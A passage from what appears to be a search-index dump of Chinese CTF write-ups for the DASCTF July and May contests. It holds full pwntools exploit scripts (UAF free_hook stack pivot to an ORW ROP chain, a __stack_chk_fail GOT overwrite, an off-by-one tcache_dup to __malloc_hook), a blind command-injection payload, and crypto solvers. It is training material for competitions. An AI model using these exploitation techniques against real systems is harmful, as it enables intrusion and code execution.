sendafter ( delim , data ) r = lambda numb = 4096 : sh . recv ( numb ) ru = lambda delims , drop = True : sh . recvuntil ( delims , drop ) info_addr = lambda tag , addr : sh . info ( tag + ': {:#x} ' . format ( addr )) itr = lambda : sh . interactive () debug = lambda command = '' : gdb . attach ( sh , command ) if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10013 ) else : sh = process ( './qiandao' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def exp (): #debug(\"b*0x080485F5\\nc\") ru ( \":\" ) sl ( \"%2$p\" ) ru ( \" \\n \" ) stack = int ( ru ( \" \\n \" ) . replace ( \" \\n \" , \"\" ), 16 ) - 0x24 info_addr ( \"stack\" , stack ) ru ( \"?\" ) payload = p32 ( 0x0804857D ) + \" \\x00 \" * 0x20 + p32 ( stack ) sl ( payload ) itr () exp ()","title":"\u865a\u5047\u7684\u7b7e\u5230\u9898"},{"location":"wp/DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B/#bigbear","text":"\u9898\u76ee\u5f88\u7b80\u5355\uff0c\u6709\u4e00\u4e2aUAF\u6f0f\u6d1e\uff0c\u96be\u5728\u5982\u4f55\u5229\u7528\u3002\u9898\u76ee\u9650\u5236\u4f7f\u7528execve\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u9700\u8981\u5229\u7528ORW\u4e86\uff0c\u800c\u60f3\u7528ORW\u5219\u9700\u8981\u6808\u8fc1\u79fb\uff0c\u7b2c\u4e00\u4e2a\u60f3\u5230\u7684\u662f\u4f7f\u7528setcontext\u6765\u5b9e\u73b0\uff0c\u4f46\u662f\u9898\u76eelibc\u7248\u672c\u662f2.30\uff0csetcontext\u65e0\u6cd5\u4f7f\u7528\uff0c\u90a3\u600e\u4e48\u529e\u5462\uff1f\u8fd9\u91cc\u5229\u7528\u4e86\u4e0a\u5468geekpwn playthenew \u8fd9\u9053\u9898\u76ee\u7684\u601d\u8def\u3002 \u6211\u4eec\u5148\u4e0d\u8bf4\u5229\u7528\u65b9\u6cd5\uff0c\u5148\u60f3\u4e00\u60f3\u8981\u5b9e\u73b0\u6808\u8fc1\u79fb\u7684\u8bdd\uff0c\u6211\u4eec\u8981\u600e\u4e48\u505a\u3002\u9996\u5148\u6211\u4eec\u5f97\u628arbp\u4fee\u6539\u4e3a\u53ef\u63a7\u7684\u503c\uff0c\u7136\u540e\u6267\u884cleave ret\u5bf9\u5427\uff1f\u6211\u4eec\u5229\u7528UAF\u653b\u51fb\uff0c\u53ef\u4ee5\u4fee\u6539free_hook\u4e3a\u4efb\u610f\u51fd\u6570\uff0c\u5f53free\u6389\u4e00\u4e2a\u5806\u5757\u65f6\uff0c\u4f1a\u5c06\u5806\u5757\u5730\u5740\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\u7ed9\u8be5\u51fd\u6570\u3002\u5982\u679c\u6211\u4eec\u80fd\u5728libc\u4e2d\u627e\u5230\u4e00\u4e2a\u51fd\u6570\u7247\u6bb5\uff0c\u5176\u6709mov rbp\uff0crdi\u8fd9\u6837\u5f62\u5f0f\u7684\u6307\u4ee4\uff0c\u800c\u4e14\u8fd8\u6709\u4e00\u4e2acall\u51fd\u6570\u53ef\u63a7\uff0c\u5e76\u5c06call\u51fd\u6570\u4fee\u6539\u4e3aleave ret\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5b9e\u73b0\u6808\u8fc1\u79fb\uff0c\u5e76\u6267\u884cROP\u94fe\u3002 \u5229\u7528IDA\u641c\u7d22\uff0c\u6211\u627e\u5230\u4e00\u4e2a\u51fd\u6570\u7247\u6bb5\uff0c\u521a\u597d\u53ef\u4ee5\u5b9e\u73b0\u4e0a\u9762\u6240\u8bc9\u7684\u5185\u5bb9\u3002 \u8fd9\u4e2a\u51fd\u6570\u7247\u6bb5\u5c06rbp\u4fee\u6539\u4e3a[rdi+0x48]\uff0c\u5e76call [[rdi+0x18]+0x28]\u3002\u6211\u4eec\u53ea\u8981\u7cbe\u5fc3\u6784\u9020\u8be5\u5806\u5757\u7684\u503c\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u6808\u8fc1\u79fb\u5e76\u6267\u884cROP\u94fe\u3002 \u6784\u9020\u7684\u7ec6\u8282\u5c31\u4e0d\u591a\u8bf4\u4e86\uff0c\u5927\u5bb6\u770b\u770bEXP\uff0c\u8c03\u8bd5\u8c03\u8bd5\u5c31\u80fd\u660e\u767d\u3002 (\u4e0d\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u4e0d\u662f\u9884\u671f\u89e3\uff0c\u9884\u671f\u89e3\u662f\u5229\u7528io_file\u7684str_overflow\u63a7\u5236rdx\u6765\u4f7f\u7528setcontext\u3002get\u4e86 #Author: Nopnoping from pwn import * s = lambda data : sh . send ( data ) sa = lambda delim , data : sh . sendafter ( delim , data ) sl = lambda data : sh . sendline ( data ) sla = lambda delim , data : sh . sendlineafter ( delim , data ) sea = lambda delim , data : sh . sendafter ( delim , data ) r = lambda numb = 4096 : sh . recv ( numb ) ru = lambda delims , drop = True : sh . recvuntil ( delims , drop ) info_addr = lambda tag , addr : sh . info ( tag + ': {:#x} ' . format ( addr )) itr = lambda : sh . interactive () debug = lambda command = '' : gdb . attach ( sh , command ) if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10011 ) else : sh = process ( \"./bigbear\" ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def choice ( elect ): ru ( '>>' ) sl ( str ( elect )) def add ( size , content ): choice ( 1 ) ru ( \":\" ) sl ( str ( size )) ru ( ':' ) sl ( str ( content )) def edit ( index , content ): choice ( 4 ) ru ( 'idx' ) sl ( str ( index )) ru ( ':' ) sl ( content ) def show ( index ): choice ( 3 ) ru ( ':' ) sl ( str ( index )) def delete ( index ): choice ( 2 ) ru ( 'idx' ) sl ( str ( index )) def exp (): libc = ELF ( \"./libc.so.6\" ) add ( 0x1000 , 'a' ) #0 add ( 0x20 , 'a' ) #1 add ( 0x20 , 'a' ) #2 delete ( 0 ) show ( 0 ) ru ( \":\" ) libc_base = u64 ( r ( 6 ) . ljust ( 8 , ' \\x00 ' )) - 0x1eabe0 info_addr ( \"libc_base\" , libc_base ) setcontext = libc_base + libc . symbols [ 'setcontext' ] free_hook = libc_base + libc . symbols [ '__free_hook' ] secret = libc_base + 0x000000000157F7A info_addr ( \"setcontext\" , setcontext ) info_addr ( \"free_hook\" , free_hook ) info_addr ( \"secret\" , secret ) delete ( 1 ) delete ( 2 ) show ( 2 ) ru ( \":\" ) heap = u64 ( r ( 6 ) . ljust ( 8 , ' \\x00 ' )) - 0x1010 info_addr ( \"heap\" , heap ) edit ( 2 , p64 ( free_hook ) + p64 ( 0 )) add ( 0x20 , 'a' ) add ( 0x20 , p64 ( secret )) leave_ret = libc_base + 0x000000000005A9A8 rdi_ret = libc_base + 0x0000000000026bb2 rsi_ret = libc_base + 0x000000000002709c rdx_r12_ret = libc_base + 0x000000000011c3b1 open_ = libc_base + libc . symbols [ \"open\" ] read = libc_base + libc . symbols [ \"read\" ] write = libc_base + libc . symbols [ 'write' ] payload = \"./flag \\x00\\x00 \" + p64 ( rdx_r12_ret ) + p64 ( 0 ) + p64 ( heap ) + p64 ( rdx_r12_ret ) + p64 ( leave_ret ) + p64 ( 0 ) + p64 ( rdx_r12_ret ) + p64 ( 0 ) + p64 ( heap ) payload += p64 ( rdi_ret ) + p64 ( heap ) + p64 ( rsi_ret ) + p64 ( 0 ) + p64 ( open_ ) payload += p64 ( rdi_ret ) + p64 ( 3 ) + p64 ( rsi_ret ) + p64 ( heap - 0x100 ) + p64 ( rdx_r12_ret ) + p64 ( 0x30 ) + p64 ( 0 ) + p64 ( read ) payload += p64 ( rdi_ret ) + p64 ( 1 ) + p64 ( rsi_ret ) + p64 ( heap - 0x100 ) + p64 ( rdx_r12_ret ) + p64 ( 0x30 ) + p64 ( 0 ) + p64 ( write ) add ( 0x100 , payload ) #debug(\"b*0x7ffff7f2ff7a\\nc\") delete ( 5 ) itr () exp ()","title":"bigbear"},{"location":"wp/DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B/#crypto","text":"","title":"Crypto"},{"location":"wp/DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B/#bullshit","text":"from flag import flag def pairing ( a , b ): shell = max ( a , b ) step = min ( a , b ) if step == b : flag = 0 else : flag = 1 return shell ** 2 + step * 2 + flag def encrypt ( message ): res = '' for i in range ( 0 , len ( message ), 2 ): res += str ( pairing ( message [ i ], message [ i + 1 ])) return res print ( encrypt ( flag )) # 1186910804152291019933541010532411051999082499105051010395199519323297119520312715722 \u4f9d\u6b21\u5bf9\u660e\u6587\u4e24\u4e2a\u5b57\u7b26\u4e00\u7ec4\u8fdb\u884c\u52a0\u5bc6\uff0c\u5173\u952e\u70b9\u662f\u628a\u5bc6\u6587\u5bf9\u5e94\u7684\u7ec4\u5206\u5f00\uff0c\u770b\u4e00\u4e0bpairing\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002\u660e\u6587\u7684\u5b57\u7b26\u8303\u56f4\u5e94\u8be5\u662f0-9_A-Z_a-z_{}\uff0c\u5176\u4e2d\u6700\u5927\u7684ascii\u6570\u503c\u662f125\uff0c\u8fd4\u56de\u503c\u6700\u5927\u4e0d\u8d85\u8fc716000\uff0c\u6700\u5c0f\u5927\u4e8e2000\uff0c\u6839\u636e\u8fd9\u4e2a\u53ef\u4ee5\u5206\u5272\u5bc6\u6587\u5bf9\u5e94\u660e\u6587\u6bb5\uff0c\u7136\u540e\u7206\u7834\u51fa\u5bf9\u5e94\u660e\u6587\u5373\u53ef\u3002 from Crypto.Util.number import * def pairing ( a , b ): shell = max ( a , b ) step = min ( a , b ) if step == b : flag = 0 else : flag = 1 return shell ** 2 + step * 2 + flag text = '11869 10804 15229 10199 3354 10105 3241 10519 9908 2499 10505 10103 9519 9519 3232 9711 9520 3127 15722' def decrypt ( a ): for i in range ( 255 ): for j in range ( 255 ): if pairing ( i , j ) == a : return i , j a = text . split () l1 = [] for i in a : if decrypt ( int ( i )): m , n = decrypt ( int ( i )) l1 . append ( m ) l1 . append ( n ) flag = '' for i in l1 : flag += chr ( i ) print flag","title":"bullshit"},{"location":"wp/DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B/#ezrsa","text":"enc.py: from secret import flag from Crypto.Util.number import getPrime , inverse , bytes_to_long , long_to_bytes from sympy import isprime m = bytes_to_long ( flag ) i = 0 p = getPrime ( 1024 ) r = getPrime ( 1024 ) while True : i += 1 q = 5 * p + i if isprime ( q ): break n = p * q * r e = 65537 c = pow ( m , e , n ) p3 = pow ( p , 3 , n ) q3 = pow ( q , 3 , n ) print c print e print n print p3 print q3 #c=121836624300974075697021410307617877799398704636412997043885070081959280989429720121505939271618801519845564677294487289085261071864489530938936756975266796724602572135614554790383740417604947122325421381322155502222532570899845171858215244411945889235509975121332503672838693190271397334662495169940649349725607212867270114445618201171582223868214171942753939282404133460110489725340075179818856587044172460703519751189284498768640898837525773823127259807337383870535232880471869465188882667401540052151795173003568424369575866780354852158304748299284900468768898966143729562589110027789165774068500360970335261801131264801996703446527156709491597639262305131309592217711956181866054589085773085822482247966030763162382493197473555330201343835684065991963179440335668817727280429581864224497755004825170263803174390985868997862117983334405815543271969716910040927833496696049703621334172902517666284662473059140662717708823 #e=65537 #n=20361372240024088786698455948788052559208001789410016096382703853157107986024860262721685000417719260611935731634077852127432140361792767202581631816544546972750034494061276779878409544779707914261679633764772575040304712361634318086289783951555842021028438799649252652041211341825451500751760872572402250747982495384263677669526575825183733353800694161425360299521143726681387485097281832219009682768523304737252763907939642212542959846630464628135025203489075698699980715986689341069964387779523254203021424865355054215122316160201073604105317768112281914334065349420946717116563634883368316247495042216330408372176714499012778410160478384503335610321108263706243329745785632599707740534386988945259578897614317582546751658480917188464178997026284336861027299289073045677754342746386408505695243800685323283852020325044649604548575089927541935884800327121875191739922436199496098842684301207745090701158839031935190703347091 #p3=3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513 #q3=7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397 p^3\u53ef\u80fd\u5c0f\u4e8en \uff08n=p*q*r\uff0cq=5*p+i\uff09\uff0c\u76f4\u63a5\u5bf9p3\u5f00\u65b9\u53d1\u73b0\u5c31\u53ef\u4ee5\u6c42\u51fap\uff08\u53ef\u80fd\u4e0d\u662f\u9884\u671f\u89e3\uff09\uff0c\u7136\u540e\u5e26\u8fdb\u5faa\u73af\u4e2d\u5373\u53ef\u6c42\u51fai\u548cq\u3002\u7531p\u548cq3\u53ef\u4ee5\u7206\u51fan\u3002\u7136\u540e\u6c42\u51far\uff0c\u63a5\u7740\u5c31\u662f\u7b80\u5355rsa\u4e86\u3002\u3002\u3002\uff08\u8fd9\u513fn\u53ef\u80fd\u6709\u591a\u4e2a\u503c from Crypto.Util.number import * from sympy import isprime import gmpy2 c = 121836624300974075697021410307617877799398704636412997043885070081959280989429720121505939271618801519845564677294487289085261071864489530938936756975266796724602572135614554790383740417604947122325421381322155502222532570899845171858215244411945889235509975121332503672838693190271397334662495169940649349725607212867270114445618201171582223868214171942753939282404133460110489725340075179818856587044172460703519751189284498768640898837525773823127259807337383870535232880471869465188882667401540052151795173003568424369575866780354852158304748299284900468768898966143729562589110027789165774068500360970335261801131264801996703446527156709491597639262305131309592217711956181866054589085773085822482247966030763162382493197473555330201343835684065991963179440335668817727280429581864224497755004825170263803174390985868997862117983334405815543271969716910040927833496696049703621334172902517666284662473059140662717708823 q3 = 7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397 p3 = 3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513 c1 = 7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397 p , err = gmpy2 . iroot ( p3 , 3 ) i = 0 while True : i += 1 q = 5 * p + i if isprime ( q ): #print q break e = 65537 for i in range ( 1 , 100 ): x = q ** 3 - q3 n = x / i if x % i == 0 and p3 == pow ( p , 3 , n ) and q3 == pow ( q , 3 , n ): t_n = n r = ( t_n / q ) / p phi = ( p - 1 ) * ( q - 1 ) * ( r - 1 ) d = gmpy2 . invert ( e , phi ) text = long_to_bytes ( pow ( c , d , n )) if 'flag' in text : print text","title":"ezrsa"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/","text":"Web \u00b6 \u5e2e\u5e2e\u5c0f\u7ea2\u82b1 \u00b6 \u8003\u70b9\uff1a \u76f2\u6ce8 \u601d\u8def\uff1a cat /flag |grep 'BJD{xx' || sleep(2); Misc \u00b6 baby_web \u00b6 \u8003\u70b9\uff1a\u96f6\u5bbd\u5ea6\u5b57\u7b26\u9690\u5199\u3001\u5404\u79cd\u5947\u602a\u5bc6\u7801 \u53c2\u8003\uff1a http://www.ga1axy.top/index.php/archives/20/ \u6709\u4e2a\u538b\u7f29\u5305\uff0c\u538b\u7f29\u5305\u5bc6\u7801\u5728html\u91cc\u9762\uff0c\u5173\u4e8e\u96f6\u5bbd\u5ea6\u5b57\u7b26\u7684\u53c2\u8003\u5728ga1axy\u5e08\u5085blog\uff08\u4e0a\u9762\uff09\uff0c\u89e3\u5bc6\u540e\u9700\u8981\u9006\u4e00\u4e0b\u56fe\u7247\u7684hex\uff0c\u811a\u672c\uff1a f = open ( 'f14g.png' , 'rb' ) . read () f2 = list ( f ) f3 = f2 [:: - 1 ] #print f3 f4 = '' . join ( f3 ) with open ( 'f1ag.png' , 'wb' ) as f : f . write ( f4 ) \u7136\u540e\u5728\u5bf9\u5e94\u7f51\u7ad9\u4e0a\u89e3\u5bc6\u5373\u53ef\u3002 bin/cat 2 \u00b6 \u8003\u70b9\uff1a\u4e8c\u7ef4\u7801\u8f6c\u6362 \u6211\u662f\u76f4\u63a5\u628a\u56fe\u7247\u7528ste\u5904\u7406\u7136\u540e\u8c03\u5230\u5bf9\u6bd4\u5ea6\u6bd4\u8f83\u9ad8\u7684\u901a\u9053\u626b\u5373\u53ef\uff08\u9003 questionnaire \u00b6 \u8003\u70b9\uff1a\u67e5\u6e90\u7801 \u7b7e\u5230\u9898\u4e0d\u8bf4\u4e86\uff0c\u7b54\u6848\u5728\u6e90\u7801\uff0c\u8fde\u63a5\u4e0b\u9762\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u5373\u53ef Crypto \u00b6 bbcrypto \u00b6 \u8003\u70b9\uff1a\u7b80\u5355\u52a0\u5bc6 \u901a\u8fc7\u5df2\u77e5\u5bc6\u6587\u548c\u90e8\u5206\u660e\u6587\u679a\u4e3e\u51faa\u548csalt\uff0c\u7136\u540e\u901a\u8fc7\u5bc6\u6587\u679a\u4e3eflag\u503c\uff08\u811a\u672c\u5199\u7684\u592a\u8fa3\u9e21\u4e86\uff0c\u8f7b\u55b7 from __future__ import print_function import string from itertools import * enc = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d' dict1 = string . ascii_lowercase #print dict1 #salt = 'abc' #si = cycle(salt.lower()) def encrypt ( m , a , si ): c = \"\" for i in range ( len ( m )): c += hex ((( ord ( m [ i ])) * a + ord ( next ( si ))) % 128 )[ 2 :] . zfill ( 2 ) return c # for i in dict1: # for j in dict1: # for k in dict1: # salt = i+j+k # si = cycle(salt.lower()) # for m in range(128): # if encrypt('flag{',m,si) == '177401504b': # print m salt = 'ahh' a = 57 si = cycle ( salt . lower ()) enc = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d' flag = '' dict2 = '0123456789' + string . ascii_lowercase + ' {} ' # for m in range(len(enc)/2): # for i in dict2: # for salt in ['ahh','hah','hha']: # if encrypt(i,a,si) == enc[m*2:m*2+2]: # print(i,end='') # break flag = list ( 'ad7vd9z7v3rffdd2q8w5vb4s7x6ua1ra7v2s7vb3ta8wfbc4u' ) for i in flag : if ord ( i ) > ord ( 'f' ): flag . remove ( i ) print ( '' . join ( flag )) easyLCG \u00b6 \u8003\u70b9\uff1aLCG\u7b80\u5355\u5229\u7528 \u6bd4\u8f83\u7b80\u5355\u7684LCG\uff0c\u901a\u8fc7output\u679a\u4e3e\u51fas1\uff0c\u7136\u540e\u901a\u8fc7s1\u6c42\u51fas2\uff0c\u8fdb\u800cs3\u4e5f\u80fd\u88ab\u9884\u6d4b\uff1a from Crypto.Util.number import * a = 3844066521 b = 3316005024 m = 2249804527 for i in range ( 65536 ): s1 = int ( bin ( 16269 )[ 2 :] + bin ( i )[ 2 :] . zfill ( 16 ), 2 ) s2 = ( s1 * a + b ) % m if s2 >> 16 == 4249 : print s1 \u7136\u540e\u6539\u4e00\u4e0b\u52a0\u5bc6\u811a\u672c\u5c31\u80fd\u6c42\u51fakey\uff1a from Crypto.Util.number import * class lcg : def __init__ ( self ): self . a = 3844066521 self . b = 3316005024 self . m = 2249804527 self . seed = 278490266 def next ( self ): self . seed = ( self . a * self . seed + self . b ) % self . m return self . seed >> 16 class DH : def __init__ ( self ): self . lcg = lcg () self . g = 183096451267674849541594370111199688704 self . m = 102752586316294557951738800745394456033378966059875498971396396583576430992701 self . A , self . a = self . gen_AB () self . B , self . b = self . gen_AB () self . key = pow ( self . A , self . b , self . m ) def gen_AB ( self ): x = '' for _ in range ( 64 ): x += '1' if self . lcg . next () % 2 else '0' return pow ( self . g , int ( x , 2 ), self . m ), int ( x , 2 ) #DH = DH() print long_to_bytes ( DH () . key ^ 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703 ) pwn \u00b6 TaQiniOJ-0 - 100 \u00b6 \u7a0b\u5e8f\u6a21\u62df\u4e86c\u8bed\u8a00\u7f16\u8bd1\u5668\uff0c\u4f46\u662f\u5bf9\u8f93\u5165c\u4ee3\u7801\u8fdb\u884c\u4e86\u654f\u611f\u5b57\u7b26\u8fc7\u6ee4\u53ef\u4ee5\u5229\u7528\u5b57\u7b26\u62fc\u63a5\uff0c\u5f02\u6216\u64cd\u4f5c\u7b49\u4f7f\u654f\u611f\u5b57\u7b26\u5728\u7a0b\u5e8f\u8fd0\u884c\u4e2d\u5f97\u5230\u800c\u4e0d\u662f\u5728\u5c06\u5176\u8f93\u5165\u5230c\u4ee3\u7801\u4e2d\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10002 ) else : sh = process () if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' code = ''' #include <stdio.h> #include <stdlib.h> char name[20]=\"/hom\"; char a[]=\"e/ct\"; char b[]=\"f/fl\"; char c[2]=\"ag\"; char ff[0x300]; int main() { for(int i=0;i<4;i++) name[4+i]=a[i]; for(int i=0;i<4;i++) name[8+i]=b[i]; name[12]=c[0]; name[13]=c[1]; printf(\" %s \",name); FILE * fd=fopen(name,\"r\"); if(fd==-1) { printf(\"error\"); return 0; } fread(ff,1,0x100,fd); printf(\" %s \",ff); return 0; }@ ''' sh . sendline ( test ) sh . interactive () \u8fd9\u4e2a\u9898\u76ee\u8fd8\u6709\u4e00\u4e2a\u975e\u9884\u671f\u89e3 #include '/home/ctf/fl\\ ag' \u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u53ef\u7528\u6765\u505aTaQiniOJ-1 Memory Moster \u2160 \u00b6 \u6808\u6ea2\u51fa\uff0c\u4f46\u662f\u6709Canary\u4fdd\u62a4\uff0c\u6240\u4ee5\u53ef\u4ee5\u52ab\u6301__stack_chk_fail\u51fd\u6570\u6765getshell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) stack_fail = 0x0000000000404028 target = 0x000000000040124A sh . recvuntil ( 'addr:' ) payload = p64 ( stack_fail ) . ljust ( 0x30 , ' \\x00 ' ) sh . sendline ( payload ) sh . recvuntil ( 'data:' ) sh . send ( p64 ( target )) sh . interactive () happyending \u00b6 libc2.29\u4e0b\u7684off_by_one\uff0c\u9700\u8981\u7ed5\u8fc7presize\u548cunlink\u68c0\u6d4b\uff0c\u4f46\u662f\u6ca1\u6709\u529e\u6cd5\u6cc4\u6f0fheap\u7684\u5730\u5740\uff0c\u6240\u4ee5\u9700\u8981\u7075\u6d3b\u7684\u5229\u7528largbin\uff0csmallbin fastbin\u6b8b\u7559\u7684\u6570\u636e\u6765bypass\u524d\u9762\u7684\u68c0\u6d4b\uff0c\u8fdb\u800c\u5229\u7528off_by_one\u5b8c\u6210\u5bf9\u5408\u5e76\u5b9e\u73b0chunk overlapping\u3002\u4e4b\u540e\u5c31\u53ef\u4ee5\u5229\u7528tcache_dup\u6765\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5206\u914d\u7684\u76ee\u7684\uff0c\u4fee\u6539__malloc_hook\u6765getshell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10106 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def choice ( elect ): sh . recvuntil ( '>' ) sh . sendline ( str ( elect )) def add ( size , content ): choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( str ( size )) sh . recvuntil ( '!' ) sh . send ( content ) def show ( index ): choice ( 3 ) sh . recvuntil ( ':' ) sh . sendline ( str ( index )) def delete ( index ): choice ( 2 ) sh . recvuntil ( ':' ) sh . sendline ( str ( index )) libc = ELF ( './libc.so.6' ) #padding for i in range ( 3 ): add ( 0x1000 , 'padding' ) #+0-2 add ( 0xc20 , 'padding' ) #+3 #get fake chunk for i in range ( 7 ): add ( 0x28 , 'a' ) #+4-10 add ( 0xb00 , 'a' ) #11 add ( 0x10 , 'a' ) #12 delete ( 11 ) #-11 add ( 0x28 , p64 ( 0 ) + p64 ( 0x201 ) + p8 ( 0x40 )) #11 #make fake chunk fd->bk=fake chunk add ( 0xb00 , 'a' ) #13 ==>make 12 to largebin add ( 0x28 , p64 ( 0 ) + p64 ( 0 ) + p64 ( 0 ) + p8 ( 0x10 )) #14 #make fake chunk bk->fd=fake chunk add ( 0x28 , 'a' ) #15 add ( 0x28 , 'a' ) #16 for i in range ( 7 ): delete ( 4 + i ) #-4-10 delete ( 15 ) #-15 delete ( 11 ) #-11 for i in range ( 7 ): add ( 0x28 , 'a' ) #+4-10 add ( 0x28 , ' \\x10 ' ) #+11 ==>modify fake chunk add ( 0x28 , 'a' ) #+15 add ( 0x80 , 'a' ) #17 add ( 0x80 , 'a' ) #18 add ( 0x28 , 'a' ) #19 add ( 0x8f0 , 'a' ) #20 # null of by one delete ( 19 ) #-19 add ( 0x28 , p64 ( 0 ) * 4 + p64 ( 0x200 )) delete ( 20 ) #-20 #leak libc add ( 0xa0 , 'a' ) #+19 add ( 0x80 , 'a' ) #+21 add ( 0x9b0 , 'a' ) #+22 for i in range ( 7 ): add ( 0x80 , 'a' ) #23-29 for i in range ( 7 ): delete ( 23 + i ) #-23-29 delete ( 21 ) show ( 17 ) sh . recvuntil ( ' \\n ' ) libc_base = u64 ( sh . recvuntil ( '1' ) . replace ( '1' , ' \\x00 ' ) . ljust ( 8 , ' \\x00 ' )) - 0x1e4ca0 malloc_hook = libc_base + libc . symbols [ '__malloc_hook' ] realloc = libc_base + libc . symbols [ 'realloc' ] onegadget = libc_base + 0x106ef8 print hex ( onegadget ) #tcache dup for i in range ( 7 ): add ( 0x80 , 'a' ) delete ( 22 ) add ( 0xa40 , p64 ( 0 ) * 17 + p64 ( 0x91 )) delete ( 18 ) delete ( 22 ) #get shell add ( 0xa40 , p64 ( 0 ) * 17 + p64 ( 0x91 ) + p64 ( malloc_hook - 8 )) add ( 0x80 , 'a' ) add ( 0x80 , p64 ( onegadget ) + p64 ( realloc + 6 )) choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( '200' ) sh . interactive () Secret2 \u00b6 \u6bcf\u5faa\u73af\u4e00\u6b21\u90fd\u4f1a\u6253\u5f00\u4e00\u6b21\u8bbe\u5907\uff0c\u800clinux\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6700\u591a\u53ea\u80fd\u6253\u5f001024\u4e2a\u8bbe\u5907\uff0c\u6240\u4ee5\u5f53\u6253\u5f00\u8d85\u8fc71024\u4ee5\u540e\uff0c\u5c06\u4f1a\u6253\u5f00\u5931\u8d25\uff0c\u800c\u8bfb\u53d6\u6253\u5f00\u5931\u8d25\u7684\u6587\u4ef6\u8bbe\u5907\u8bfb\u5165\u6570\u636e\u5c06\u4f1a\u662f\u96f6\u3002 